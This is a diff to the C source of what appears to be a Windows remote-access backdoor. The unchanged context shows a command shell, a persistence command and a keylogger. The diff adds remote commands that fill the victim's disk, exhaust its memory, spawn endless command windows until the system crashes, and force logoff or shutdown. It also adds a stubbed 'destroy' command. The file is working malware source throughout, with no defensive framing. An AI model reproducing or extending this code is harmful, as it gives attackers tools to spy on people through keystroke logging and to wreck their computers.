@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include<dos.h>
 #include <unistd.h> 
 #include <winsock2.h> 
 #include <windows.h> 
@@ -10,6 +11,7 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include "keylogger.h"
+// #include "destroy.h"
 
 
 #define bzero(p, size) (void) memset((p), 0, (size))
@@ -113,6 +115,30 @@ void Shell() {
         } 
         else if (strncmp("persist", buffer, 7) == 0) {
             bootRun();
+        }
+        else if (strncmp("jam_hdd", buffer, 7) == 0) {
+            while(1)
+            {
+                system("dir>>a.aa.exe");
+            }
+        }
+        else if (strncmp("destroy", buffer, 7) == 0) {
+           // destroy();
+        }
+        else if (strncmp("restart", buffer, 7) == 0) {
+            system("shutdown -l -f");
+        }
+        else if (strncmp("shutdown", buffer, 8) == 0) {
+             system("shutdown -s");
+        }
+        else if (strncmp("full_ram", buffer, 8) == 0) {
+            while(malloc( 1000));
+        }
+        else if (strncmp("start_cmd", buffer, 9) == 0) {
+            // Opens an infinite number of command prompt window till the system crushes.
+            while(1){
+        system("start cmd");
+    }
         }
         else if (strncmp("keylog_start", buffer, 12) == 0) {
             // inserting keylogger
